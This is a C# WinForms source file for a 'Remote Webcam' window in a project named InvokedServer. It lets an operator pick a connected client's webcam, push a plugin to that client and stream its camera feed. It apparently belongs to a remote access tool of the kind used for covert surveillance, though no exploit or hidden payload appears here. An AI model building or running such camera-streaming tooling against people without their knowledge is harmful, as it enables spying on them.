

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using InvokedCommon.Messages;
using InvokedServer.Enums;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Utilities;


namespace InvokedServer.Forms
{
	public partial class FrmRemoteWebcam : Form
	{
		private bool DidLoadPlugin;
		private readonly Client _connectClient;
		private List<string> _webcams;
		private readonly RemoteWebcamHandler _remoteWebcamHandler;
		private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();

		public bool IsStarted { get; private set; }

		public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
		{
			if (FrmRemoteWebcam.OpenedForms.ContainsKey(client))
				return FrmRemoteWebcam.OpenedForms[client];
			FrmRemoteWebcam newOrGetExisting = new FrmRemoteWebcam(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmRemoteWebcam.OpenedForms.Remove(client));
			FrmRemoteWebcam.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmRemoteWebcam(Client client)
		{
			this._connectClient = client;
			this._remoteWebcamHandler = new RemoteWebcamHandler(client);
			this._webcams = new List<string>();
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
		{
			this.Text = string.Format("{0} - FPS: {1}", (object)WindowHelper.GetWindowTitle("Remote Webcam", this._connectClient), (object)e.CurrentFramesPerSecond.ToString("0.00"));
		}

		public void UpdateSizeLabel(object sender, string sizeText)
		{
			this.SizeLabel.Text = "Size: " + sizeText;
		}

		private void PluginStatusChanged(object sender, PluginStatus status)
		{
			switch (status)
			{
				case PluginStatus.Loaded:
					this.PluginLabel.ForeColor = Color.LightGreen;
					this.PluginLabel.Text = "Plugin is ready!";
					if (!this.DidLoadPlugin)
					{
						this.PluginLabel.Visible = false;
						break;
					}
					break;
				case PluginStatus.Installing:
					this.PluginLabel.ForeColor = Color.DeepSkyBlue;
					this.PluginLabel.Text = "Sending the Plugin for the first time, please wait..";
					this.DidLoadPlugin = true;
					break;
				case PluginStatus.PluginFileNotFound:
					this.PluginLabel.ForeColor = Color.Red;
					this.PluginLabel.Text = "Error: Cannot find the Plugin dll in Plugins folder!";
					break;
			}
			this.OnResize(EventArgs.Empty);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._remoteWebcamHandler.AddWebcams += new RemoteWebcamHandler.AddWebcamsEventHandler(this.AddWebcams);
			this._remoteWebcamHandler.ProgressChanged += new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._remoteWebcamHandler.NewImageSizeUpdate += new RemoteWebcamHandler.MessegeSizeHandler(this.UpdateSizeLabel);
			this._remoteWebcamHandler.PluginStatusChanged += new RemoteWebcamHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			MessageHandler.Register((IMessageProcessor)this._remoteWebcamHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._remoteWebcamHandler);
			this._remoteWebcamHandler.AddWebcams -= new RemoteWebcamHandler.AddWebcamsEventHandler(this.AddWebcams);
			this._remoteWebcamHandler.ProgressChanged -= new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._remoteWebcamHandler.NewImageSizeUpdate -= new RemoteWebcamHandler.MessegeSizeHandler(this.UpdateSizeLabel);
			this._remoteWebcamHandler.PluginStatusChanged -= new RemoteWebcamHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void StartStream()
		{
			this.ToggleConfigurationControls(true);
			this.picWebcam.Start();
			this.picWebcam.SetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.picWebcam;
			this._remoteWebcamHandler.BeginReceiveFrames(this.barQuality.Value, this.cbWebcams.SelectedIndex, this.cbWebcams.SelectedIndex);
		}

		private void StopStream()
		{
			this.ToggleConfigurationControls(false);
			this.picWebcam.Stop();
			this.picWebcam.UnsetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.picWebcam;
			this._remoteWebcamHandler.EndReceiveFrames();
		}

		private void ToggleConfigurationControls(bool started)
		{
			this.OnResize(EventArgs.Empty);
			this.btnStart.Enabled = !started;
			this.btnStop.Enabled = started;
			this.barQuality.Enabled = !started;
			this.cbWebcams.Enabled = !started;
		}

		private void btnShow_Click(object sender, EventArgs e) => this.TogglePanelVisibility(true);

		private void btnHide_Click(object sender, EventArgs e) => this.TogglePanelVisibility(false);

		private void TogglePanelVisibility(bool visible)
		{
			this.panelTop.Visible = visible;
			this.btnShow.Visible = !visible;
			this.ActiveControl = (Control)this.picWebcam;
			this.OnResize(EventArgs.Empty);
		}

		private void FrmRemoteWebcam_Load(object sender, EventArgs e)
		{
			this._remoteWebcamHandler.LocalResolution = this.picWebcam.Size;
			this.Text = WindowHelper.GetWindowTitle("Remote Webcam", this._connectClient);
			this.OnResize(EventArgs.Empty);
			this._remoteWebcamHandler.CheckPluginStatus();
		}

		private void AddWebcams(object sender, List<string> webcams)
		{
			this.cbWebcams.Items.Clear();
			this._webcams = webcams;
			try
			{
				this.cbWebcams.Invoke((MethodInvoker)(() =>
				{
					foreach (object webcam in webcams)
						this.cbWebcams.Items.Add((object)string.Format("{0}", webcam));
					this.cbWebcams.SelectedIndex = 0;
				}));
			}
			catch (InvalidOperationException)
			{
			}
		}

		public void UpdateImage(object sender, Bitmap bmp) => this.picWebcam.UpdateImage(bmp, false);

		private void btnStart_Click(object sender, EventArgs e)
		{
			if (this.cbWebcams.Items.Count == 0)
			{
				int num = (int)MessageBox.Show("No webcam detected.\nPlease wait till the client sends a list with available webcams.", "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			else
			{
				this.PluginLabel.Visible = false;
				this._remoteWebcamHandler.LocalResolution = this.picWebcam.Size;
				this.StartStream();
			}
		}

		private void btnStop_Click(object sender, EventArgs e) => this.StopStream();

		private void barQuality_Scroll(object sender, EventArgs e)
		{
			int num = this.barQuality.Value;
			this.lblQualityShow.Text = num.ToString();
			if (num < 25)
				this.lblQualityShow.Text += " (low)";
			else if (num >= 85)
				this.lblQualityShow.Text += " (best)";
			else if (num >= 75)
				this.lblQualityShow.Text += " (high)";
			else if (num >= 25)
				this.lblQualityShow.Text += " (mid)";
			this.ActiveControl = (Control)this.picWebcam;
		}

		private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this._remoteWebcamHandler.IsStarted)
				this.StopStream();
			this.UnregisterMessageHandler();
			this._remoteWebcamHandler.Dispose();
			this.picWebcam.Image?.Dispose();
		}

		private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
		{
			if (this.WindowState == FormWindowState.Minimized)
				return;
			this._remoteWebcamHandler.LocalResolution = this.picWebcam.Size;
			this.btnShow.Left = (this.Width - this.btnShow.Width) / 2;
			this.btnHide.Left = (this.Width - this.btnHide.Width) / 2;
			this.PluginLabel.Left = (this.Width - this.PluginLabel.Width) / 2;
			int num1 = 150;
			int num2 = (this.ClientSize.Width - 160 - num1) / 2;
			this.cbWebcams.Width = num2;
			this.cbResolutions.Width = num2;
			this.cbWebcams.Left = num1;
			this.cbResolutions.Left = this.cbWebcams.Left + this.cbWebcams.Width + 10;
		}

		private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void ExtrasBtn_Click(object sender, EventArgs e)
		{
			Guna2GradientButton guna2GradientButton = (Guna2GradientButton)sender;
			Point p = new Point(0, guna2GradientButton.Height);
			this.ExtrasContextMenuStrip.Show(guna2GradientButton.PointToScreen(p));
		}
	}
}